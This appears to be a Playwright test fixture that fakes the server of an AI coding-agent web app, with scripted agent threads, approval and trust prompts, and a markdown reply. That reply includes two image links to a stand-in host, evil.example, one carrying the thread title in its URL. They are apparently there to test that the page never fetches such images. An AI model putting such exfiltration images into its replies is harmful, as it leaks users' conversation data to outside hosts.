import type { ModelInfo, RawEvent, Space, TaskInfo, ThreadSummary, TrustAsk } from '@glave/client';
import type { Page, Route } from '@playwright/test';

/**
 * What the fake server knows: a project and the person's own space with their threads, one
 * thread's history (a turn on this computer that ran a command, edited a file and wrote a new
 * one, and replied from the default model, which the picker shows; how long it took and what
 * it cost), another waiting for the person to allow a push, the models, the tasks, what a
 * turn streams, the folders on the person's computer, and the projects made while it runs.
 */
const OWNER = { kind: 'person', id: '01900000-0000-7000-8000-0000000000aa' } as const;

function space(id: string, name: string, kind: Space['kind']): Space {
  return {
    id,
    kind,
    name,
    owner: OWNER,
    members: [],
    created_at: '2026-10-11T10:00:00.000Z',
    updated_at: '2026-10-11T10:00:00.000Z',
  };
}

const PROJECT = space('01900000-0000-7000-8000-000000000001', 'glave', 'project');
export const PERSONAL = space('01900000-0000-7000-8000-000000000002', 'Personal', 'personal');

const TOKENS = { input: 1200, output: 300, cache_read: 0, cache_write: 0, reasoning: 0 };

function thread(
  id: string,
  title: string,
  status: ThreadSummary['status'] = 'idle',
  inSpace = PROJECT,
): ThreadSummary {
  return {
    id,
    space: inSpace.id,
    status,
    standing: 'active',
    title,
    approval: 'auto',
    origin: { kind: 'web' },
    created_at: '2026-10-11T10:00:00.000Z',
    updated_at: '2026-10-11T10:05:00.000Z',
    turns: 1,
    tokens: TOKENS,
  };
}

export const THREAD = '01900000-0000-7000-8000-000000000101';
export const NEW_THREAD = '01900000-0000-7000-8000-000000000102';
/** The thread that waits for the person. */
export const WAITING = '01900000-0000-7000-8000-000000000103';

const THREADS: Readonly<Record<string, readonly ThreadSummary[]>> = {
  [PROJECT.id]: [
    thread(THREAD, 'Make the tests pass'),
    thread(WAITING, 'Review the release notes', 'waiting'),
    thread('01900000-0000-7000-8000-000000000104', 'Nightly dependency audit', 'running'),
  ],
  [PERSONAL.id]: [
    thread('01900000-0000-7000-8000-000000000105', 'Dinner ideas for Saturday', 'idle', PERSONAL),
  ],
};

/** The default model: no name configured, so the app names it from its id. */
const DEFAULT_MODEL = 'anthropic/claude-haiku-5.5';

/**
 * The models the fake server runs: its default, Hope, two more, and a long catalogue like
 * OpenRouter's, which the picker must search and scroll.
 */
export const MODELS: readonly ModelInfo[] = [
  { id: DEFAULT_MODEL, default: true, hope: false },
  { id: 'hope-12b', name: 'Hope', default: false, hope: true },
  { id: 'openai/gpt-6-luna', default: false, hope: false },
  { id: 'deepseek/deepseek-v4.1-flash', default: false, hope: false },
  ...Array.from({ length: 200 }, (_, index) => ({
    id: `lab-${String(index % 20)}/model-${String(index)}`,
    default: false,
    hope: false,
  })),
];

function event(
  seq: number,
  type: string,
  data: RawEvent['data'],
  id = THREAD,
  at = '2026-10-11T10:00:00.000Z',
): RawEvent {
  return {
    glave: 1,
    id: `01900000-0000-7000-8000-${String(seq).padStart(12, '0')}`,
    thread: id,
    seq,
    at,
    type,
    v: 1,
    data,
  };
}

function call(
  seq: number,
  callId: string,
  tool: string,
  json: Record<string, unknown>,
  id = THREAD,
): RawEvent {
  return event(seq, 'tool.call.requested', { call_id: callId, tool, arguments: { json } }, id);
}

function done(seq: number, callId: string, text: string, id = THREAD): RawEvent {
  return event(
    seq,
    'tool.call.completed',
    { call_id: callId, is_error: false, output: [{ type: 'text', text }] },
    id,
  );
}

/** The thread's workspace: a folder on the computer glave runs on. */
function bound(seq: number, id = THREAD): RawEvent {
  const computer = { id: '01900000-0000-7000-8000-0000000000c1', kind: 'local' };
  return event(seq, 'workspace.bound', { computer, root: '/work/glave' }, id);
}

const HISTORY = [
  event(1, 'thread.started', {}),
  bound(2),
  event(3, 'turn.started', { model: { provider: 'e2e', name: DEFAULT_MODEL } }),
  event(4, 'message.added', {
    role: 'user',
    parts: [{ type: 'text', text: 'Make the tests pass' }],
  }),
  call(5, 'call_1', 'bash', { command: 'cargo test' }),
  done(6, 'call_1', 'test parse::empty ... FAILED'),
  call(7, 'call_2', 'edit', {
    path: 'src/parse.rs',
    old_string: 'fn parse(input: &str) -> Value {\n    input.parse().unwrap()\n}',
    new_string:
      'fn parse(input: &str) -> Option<Value> {\n    if input.is_empty() {\n        return None;\n    }\n    input.parse().ok()\n}',
  }),
  done(8, 'call_2', 'Edited src/parse.rs'),
  call(9, 'call_3', 'write', {
    path: 'tests/empty.rs',
    content: '#[test]\nfn empty_input_is_none() {\n    assert_eq!(parse(""), None);\n}\n',
  }),
  done(10, 'call_3', 'Wrote tests/empty.rs'),
  call(11, 'call_4', 'bash', { command: 'cargo test' }),
  done(12, 'call_4', 'test result: ok. 12 passed'),
  event(13, 'message.added', {
    role: 'assistant',
    parts: [
      {
        type: 'text',
        text: 'They pass now. parse() returned a value for empty input and unwrapped a failed parse; it now returns None for both, and a new test covers the empty case.',
      },
    ],
  }),
  event(14, 'model.responded', {
    model: { provider: 'e2e', name: DEFAULT_MODEL },
    stop: 'end_turn',
    cost: { amount: { micros: 4200, currency: 'USD' }, price_list: 'e2e' },
  }),
  event(15, 'turn.ended', { outcome: 'completed' }, THREAD, '2026-10-11T10:02:05.000Z'),
];

/** The waiting thread's history: it tidied a file and waits to push it. */
const WAITING_HISTORY = [
  event(1, 'thread.started', {}, WAITING),
  bound(2, WAITING),
  event(3, 'turn.started', { model: { provider: 'e2e', name: DEFAULT_MODEL } }, WAITING),
  event(
    4,
    'message.added',
    { role: 'user', parts: [{ type: 'text', text: 'Tidy the release notes and push them' }] },
    WAITING,
  ),
  call(
    5,
    'call_1',
    'edit',
    { path: 'docs/RELEASE.md', old_string: '- fixed stuff', new_string: '- Fixed the parser' },
    WAITING,
  ),
  done(6, 'call_1', 'Edited docs/RELEASE.md', WAITING),
  event(
    7,
    'message.added',
    { role: 'assistant', parts: [{ type: 'text', text: 'The notes are tidy. Ready to push.' }] },
    WAITING,
  ),
  call(8, 'call_2', 'bash', { command: 'git push -u origin docs/release-notes' }, WAITING),
  event(
    9,
    'approval.requested',
    {
      call_id: 'call_2',
      tool: 'bash',
      summary: 'bash: git push -u origin docs/release-notes',
      secret: false,
      caution: 'It pushes to a remote.',
    },
    WAITING,
  ),
];

/**
 * A project whose folder brings its own tools and settings, not trusted yet, and its thread,
 * which asks the person to trust them (`fakeApi`'s `trust`).
 */
const ACME = space('01900000-0000-7000-8000-000000000003', 'acme', 'project');
export const TRUSTING = '01900000-0000-7000-8000-000000000107';

/** What acme asks to be trusted, in the plain words the server sends. */
export const TRUST_ASK: TrustAsk = {
  ask: '5f2c9d0a1b7e4c3d8e6f0a9b2c1d4e7f5a8b3c6d9e0f1a2b4c7d8e9f0a1b2c3d',
  items: [
    { text: 'Runs a tool server', detail: 'npx @acme/mcp' },
    { text: 'Runs a hook before each command', detail: './scripts/check.sh' },
    { text: 'Lets glave approve actions without asking' },
    { text: 'Turns off the sandbox' },
  ],
};

/** The trusting thread's history: one exchange, before the project's tools are on. */
const TRUSTING_HISTORY = [
  event(1, 'thread.started', {}, TRUSTING),
  bound(2, TRUSTING),
  event(3, 'turn.started', { model: { provider: 'e2e', name: DEFAULT_MODEL } }, TRUSTING),
  event(
    4,
    'message.added',
    { role: 'user', parts: [{ type: 'text', text: 'Search the Acme docs for the release steps' }] },
    TRUSTING,
  ),
  event(
    5,
    'message.added',
    {
      role: 'assistant',
      parts: [
        {
          type: 'text',
          text: 'The Acme docs search is one of this project’s own tools, which are off until you trust the project.',
        },
      ],
    },
    TRUSTING,
  ),
  event(6, 'turn.ended', { outcome: 'completed' }, TRUSTING, '2026-10-11T10:00:04.000Z'),
];

/** Whether acme asks to be trusted, while the fake runs: until the person answers. */
interface Trust {
  asking: boolean;
}

/** The trusting thread as acme's lists and `thread/get` show it. */
function trusting(trust: Trust): ThreadSummary {
  const summary = thread(TRUSTING, 'Search the Acme docs', 'idle', ACME);
  return trust.asking ? { ...summary, status: 'waiting', trust: TRUST_ASK } : summary;
}

/** Each thread's history, by id. */
const HISTORIES: Readonly<Record<string, readonly RawEvent[]>> = {
  [THREAD]: HISTORY,
  [WAITING]: WAITING_HISTORY,
  [TRUSTING]: TRUSTING_HISTORY,
};

const TASKS: readonly TaskInfo[] = [
  {
    thread: '01900000-0000-7000-8000-000000000104',
    kind: 'agent',
    title: 'Nightly dependency audit',
    model: 'hope-12b',
    tokens: { ...TOKENS, input: 48200, output: 3100 },
    cost: { micros: 21500, currency: 'USD' },
    started_at: '2026-10-11T10:00:00.000Z',
    elapsed_ms: 754_000,
    status: 'running',
  },
  {
    thread: '01900000-0000-7000-8000-000000000106',
    kind: 'agent',
    title: 'Summarize open issues',
    model: DEFAULT_MODEL,
    tokens: TOKENS,
    cost: { micros: 4200, currency: 'USD' },
    started_at: '2026-10-11T09:00:00.000Z',
    elapsed_ms: 125_000,
    status: 'finished',
    outcome: 'completed',
  },
];

/** The folders on the person's computer, by path; the home folder is /Users/ana. */
const HOME = '/Users/ana';
const FOLDERS: Readonly<Record<string, readonly string[]>> = {
  '/': ['Users'],
  '/Users': ['ana'],
  [HOME]: ['code', 'Documents'],
  [`${HOME}/code`]: ['glave', 'notes'],
  [`${HOME}/code/glave`]: [],
  [`${HOME}/code/notes`]: [],
  [`${HOME}/Documents`]: [],
};

/** The repository the fake host does not have, which a clone fails on. */
export const MISSING_REPOSITORY = 'https://github.com/acme/missing';

/** How long a clone takes, so the page shows it under way. */
const CLONE_MS = 400;

/** What a server refuses a call with. */
class Refusal {
  constructor(
    readonly code: number,
    readonly message: string,
  ) {}
}

/** The folders inside `path`, as `folder/list` answers. */
function listFolders(path: string): unknown {
  const folders = FOLDERS[path];
  if (folders === undefined) {
    return new Refusal(-32602, `there is no folder at ${path}`);
  }
  const parent = path === '/' ? null : path.slice(0, path.lastIndexOf('/')) || '/';
  return { path, parent, folders };
}

/**
 * Makes a project as `space/create` does: a name taken among the person's projects gets the
 * next free one, and a repository the host does not have is refused with what git said.
 */
function makeProject(params: Record<string, unknown>, made: Space[]): unknown {
  const folder = params['folder'] as { kind: string; url?: string } | null | undefined;
  const url = folder?.url ?? '';
  if (folder?.kind === 'repository' && !/^https:\/\/[^/@]+\/./u.test(url)) {
    return new Refusal(
      -32602,
      `"${url}" is not a repository's address: give its https:// address, such as https://github.com/acme/app, with no user name or token in it`,
    );
  }
  if (folder?.kind === 'repository' && url === MISSING_REPOSITORY) {
    return new Refusal(
      -32025,
      `could not clone ${MISSING_REPOSITORY}: remote: Repository not found. If the repository is private, connect its git host first`,
    );
  }
  const asked = String(params['name']);
  const taken = new Set([PROJECT, ...made].map((each) => each.name.toLowerCase()));
  let name = asked;
  for (let next = 2; taken.has(name.toLowerCase()); next += 1) {
    name = `${asked} ${String(next)}`;
  }
  const project = space(
    `01900000-0000-7000-8000-${String(900 + made.length).padStart(12, '0')}`,
    name,
    'project',
  );
  made.push(project);
  return { space: project };
}

/** A request the fake answered: its method and params. */
export interface Request {
  readonly method: string;
  readonly params: Record<string, unknown>;
}

/** A JSON-RPC message the fake sends. */
type Note = Readonly<Record<string, unknown>>;

/**
 * What a turn streams: the person's message, the reply growing piece by piece, then the reply
 * itself and the turn's result (answering call `id`).
 */
function turnNotes(
  target: string,
  prompt: string,
  pieces: readonly string[],
  id: number,
): readonly Note[] {
  const after = target === THREAD ? HISTORY.length : 0;
  const added = (seq: number, role: string, text: string): Note => ({
    jsonrpc: '2.0',
    method: 'thread/event',
    params: {
      thread: target,
      event: event(seq, 'message.added', { role, parts: [{ type: 'text', text }] }, target),
    },
  });
  return [
    added(after + 1, 'user', prompt),
    ...pieces.map((text) => ({
      jsonrpc: '2.0',
      method: 'turn/live',
      params: { thread: target, update: { kind: 'text', text } },
    })),
    added(after + 2, 'assistant', pieces.join('')),
    {
      jsonrpc: '2.0',
      id,
      result: { turn: { outcome: 'completed', model_calls: 1, tool_calls: 0, tokens: TOKENS } },
    },
  ];
}

function turn(message: { id: number; params: Record<string, unknown> }): string {
  const notes = turnNotes(
    String(message.params['thread']),
    String(message.params['prompt']),
    ['Glad to ', 'help.'],
    message.id,
  );
  return notes.map((note) => `data: ${JSON.stringify(note)}\n\n`).join('');
}

/** What the person asks for a reply in markdown (`streamReply`). */
export const MARKDOWN_PROMPT = 'What changed?';

/**
 * A reply in markdown as a model writes it: a heading, a table, a task list, code, a link, and
 * two images that must never be fetched, one written in markdown and one in raw HTML.
 */
export const MARKDOWN_REPLY = [
  '## The parser is fixed',
  '',
  '`parse()` returned a value for **empty input** and unwrapped a failed parse; it now returns ' +
    '`None` for both. See [the issue](https://github.com/glave-ai/glave/issues/226).',
  '',
  '| Input | Before | After |',
  '| :---- | :----: | ----: |',
  '| `""` | panic | `None` |',
  '| `"12"` | `12` | `Some(12)` |',
  '',
  '- [x] Return `None` for empty input',
  '- [ ] Document the change',
  '',
  '```rust',
  'fn parse(input: &str) -> Option<Value> {',
  '    if input.is_empty() {',
  '        return None;',
  '    }',
  '    input.parse().ok()',
  '}',
  '```',
  '',
  '![Coverage by file](https://evil.example/chart.png?thread=make-the-tests-pass)',
  '',
  '<img src="https://evil.example/pixel.png">',
].join('\n');

/**
 * Makes the page's next turn stream `reply` to `THREAD` a few characters at a time, as a model
 * would: the page's own `fetch` answers `turn/start` with a stream that sends each piece on its
 * own, `delay` milliseconds apart, so the page renders the reply as it grows.
 */
export async function streamReply(page: Page, reply = MARKDOWN_REPLY, delay = 15): Promise<void> {
  const pieces = reply.match(/[\s\S]{1,6}/gu) ?? [];
  const notes = turnNotes(THREAD, MARKDOWN_PROMPT, pieces, 0);
  await page.addInitScript(
    ({ notes, delay }) => {
      const real = window.fetch.bind(window);
      window.fetch = async (input, init) => {
        const body = typeof init?.body === 'string' ? init.body : '';
        if (!body.includes('"turn/start"')) {
          return real(input, init);
        }
        const { id } = JSON.parse(body) as { id: number };
        const encoder = new TextEncoder();
        const stream = new ReadableStream<Uint8Array>({
          async start(controller) {
            for (const note of notes) {
              const message = 'result' in note ? { ...note, id } : note;
              controller.enqueue(encoder.encode(`data: ${JSON.stringify(message)}\n\n`));
              await new Promise((resolve) => setTimeout(resolve, delay));
            }
            controller.close();
          },
        });
        return new Response(stream, { headers: { 'Content-Type': 'text/event-stream' } });
      };
    },
    { notes, delay },
  );
}

/** The id the fake answers a message sent while its turn runs with (`steerTurn`). */
const QUEUED_ID = '01900000-0000-7000-8000-000000000999';

/** What a turn that is steered sends: `steerTurn`'s page script. */
interface Steering {
  /** The person's message, recorded at `seq`, under `id` when it has one. */
  readonly said: (seq: number, text: string, id?: string) => string;
}

/**
 * Makes the page's next turn in `THREAD` one the person steers: it starts on their message and
 * runs a command, then waits until the test lets the model read (`window.glaveSteer.read()`).
 * A message sent meanwhile is answered at once as queued; once read, it is recorded where the
 * model saw it, and the model answers it. The page's own `fetch` answers, as in `streamReply`.
 */
export async function steerTurn(page: Page): Promise<void> {
  const after = HISTORY.length;
  await page.addInitScript(
    ({ after, thread, queuedId }) => {
      const real = window.fetch.bind(window);
      const encoder = new TextEncoder();
      let read: () => void = () => undefined;
      const reading = new Promise<void>((resolve) => {
        read = resolve;
      });
      let sent = '';
      let turns = 0;
      Object.assign(window, { glaveSteer: { read } });
      const at = '2026-10-11T10:10:00.000Z';
      const stored = (seq: number, type: string, data: unknown, id?: string): string =>
        JSON.stringify({
          jsonrpc: '2.0',
          method: 'thread/event',
          params: {
            thread,
            event: {
              glave: 1,
              id: id ?? `01900000-0000-7000-8000-${String(seq).padStart(12, '0')}`,
              thread,
              seq,
              at,
              type,
              v: 1,
              data,
            },
          },
        });
      const steering: Steering = {
        said: (seq, text, id) =>
          stored(seq, 'message.added', { role: 'user', parts: [{ type: 'text', text }] }, id),
      };
      const live = (text: string): string =>
        JSON.stringify({
          jsonrpc: '2.0',
          method: 'turn/live',
          params: { thread, update: { kind: 'text', text } },
        });
      window.fetch = async (input, init) => {
        const body = typeof init?.body === 'string' ? init.body : '';
        if (!body.includes('"turn/start"')) {
          return real(input, init);
        }
        const { id, params } = JSON.parse(body) as { id: number; params: { prompt: string } };
        turns += 1;
        if (turns > 1) {
          sent = params.prompt;
          const queued = { jsonrpc: '2.0', id, result: { queued: { id: queuedId } } };
          return new Response(JSON.stringify(queued), {
            headers: { 'Content-Type': 'application/json' },
          });
        }
        const command = { command: 'sed -i s/8080/3000/ config.toml' };
        const stream = new ReadableStream<Uint8Array>({
          async start(controller) {
            const send = (message: string): void => {
              controller.enqueue(
                encoder.encode(`data: ${message}

`),
              );
            };
            send(stored(after + 1, 'turn.started', {}));
            send(steering.said(after + 2, params.prompt));
            send(live('Setting the port to 3000.'));
            send(
              stored(after + 3, 'tool.call.requested', {
                call_id: 'call_9',
                tool: 'bash',
                arguments: { json: command },
              }),
            );
            send(
              stored(after + 4, 'tool.call.completed', {
                call_id: 'call_9',
                is_error: false,
                output: [{ type: 'text', text: '' }],
              }),
            );
            await reading;
            send(steering.said(after + 5, sent, queuedId));
            send(live('Using 4000 instead.'));
            send(
              stored(after + 6, 'message.added', {
                role: 'assistant',
                parts: [{ type: 'text', text: 'Using 4000 instead.' }],
              }),
            );
            send(stored(after + 7, 'turn.ended', { outcome: 'completed' }));
            const tokens = { input: 1, output: 1, cache_read: 0, cache_write: 0, reasoning: 0 };
            const turn = { outcome: 'completed', model_calls: 2, tool_calls: 1, tokens };
            send(JSON.stringify({ jsonrpc: '2.0', id, result: { turn } }));
            controller.close();
          },
        });
        return new Response(stream, { headers: { 'Content-Type': 'text/event-stream' } });
      };
    },
    { after, thread: THREAD, queuedId: QUEUED_ID },
  );
}

/**
 * The answer to a call that is not a turn; `started` holds the threads started so far, `made`
 * the projects made, and `trust` acme's ask, when the test has acme.
 */
function answer(
  method: string,
  params: Record<string, unknown>,
  started: ThreadSummary[],
  made: Space[],
  trust: Trust | null,
): unknown {
  if (trust !== null) {
    const asked = trusted(method, params, trust);
    if (asked !== undefined) {
      return asked;
    }
  }
  switch (method) {
    case 'space/list':
      return { spaces: [...made, PROJECT, PERSONAL] };
    case 'space/create':
      return makeProject(params, made);
    case 'folder/list':
      return listFolders(typeof params['path'] === 'string' ? params['path'] : HOME);
    case 'thread/list': {
      const space = String(params['space']);
      const fresh = started.filter((each) => each.space === space);
      return { threads: [...fresh, ...(THREADS[space] ?? [])] };
    }
    case 'thread/get':
      return { thread: thread(String(params['thread']), 'Make the tests pass') };
    case 'thread/events':
      return { events: HISTORIES[String(params['thread'])] ?? [] };
    case 'thread/start': {
      const inSpace = params['space'] === PERSONAL.id ? PERSONAL : PROJECT;
      const fresh = thread(NEW_THREAD, '', 'idle', inSpace);
      started.push(fresh);
      return { thread: fresh };
    }
    case 'thread/rename':
      return { thread: thread(String(params['thread']), String(params['title'])) };
    case 'model/list':
      return { models: MODELS };
    case 'tasks/list':
      return { tasks: TASKS };
    case 'memory/list':
      return { memories: [] };
    case 'provider/list':
      return {
        providers: [
          {
            id: '01900000-0000-7000-8000-000000000301',
            kind: 'openrouter',
            hint: 'a1b2',
            models: [],
          },
        ],
      };
    case 'credential/list':
      return { credentials: [], device: true };
    case 'server/discover':
      return {
        name: 'glave',
        version: '0.0.0',
        protocols: ['2026-10'],
        approval: 'auto',
        approvals: ['ask', 'auto'],
      };
    default:
      return {};
  }
}

/** The answer to a call about acme, the project that asks to be trusted; else `undefined`. */
function trusted(method: string, params: Record<string, unknown>, trust: Trust): unknown {
  switch (method) {
    case 'space/list':
      return { spaces: [ACME, PROJECT, PERSONAL] };
    case 'thread/list':
      return params['space'] === ACME.id ? { threads: [trusting(trust)] } : undefined;
    case 'thread/get':
      return params['thread'] === TRUSTING ? { thread: trusting(trust) } : undefined;
    case 'trust/answer':
      if (params['ask'] !== TRUST_ASK.ask || !trust.asking) {
        return new Refusal(-32026, 'this project changed since you were asked');
      }
      trust.asking = false;
      return { thread: trusting(trust) };
    default:
      return undefined;
  }
}

/**
 * Answers the session API's calls the app makes, as JSON-RPC over POST /. With `trust`, the
 * person also has acme, a project that asks to be trusted.
 */
export async function fakeApi(
  page: Page,
  { trust = false }: { readonly trust?: boolean } = {},
): Promise<{ readonly calls: readonly string[]; readonly requests: readonly Request[] }> {
  const calls: string[] = [];
  const requests: Request[] = [];
  const started: ThreadSummary[] = [];
  const made: Space[] = [];
  const asking: Trust | null = trust ? { asking: true } : null;
  await page.route('**/*', async (route: Route) => {
    const request = route.request();
    if (request.method() !== 'POST') {
      await route.fallback();
      return;
    }
    const message = request.postDataJSON() as {
      id: number;
      method: string;
      params: Record<string, unknown>;
    };
    calls.push(message.method);
    requests.push({ method: message.method, params: message.params });
    if (message.method === 'turn/start') {
      await route.fulfill({ contentType: 'text/event-stream', body: turn(message) });
      return;
    }
    const folder = message.params['folder'] as { kind: string } | null | undefined;
    if (message.method === 'space/create' && folder?.kind === 'repository') {
      await new Promise((resolve) => setTimeout(resolve, CLONE_MS));
    }
    const answered = answer(message.method, message.params, started, made, asking);
    const reply =
      answered instanceof Refusal
        ? { error: { code: answered.code, message: answered.message } }
        : { result: answered };
    await route.fulfill({
      contentType: 'application/json',
      body: JSON.stringify({ jsonrpc: '2.0', id: message.id, ...reply }),
    });
  });
  return { calls, requests };
}
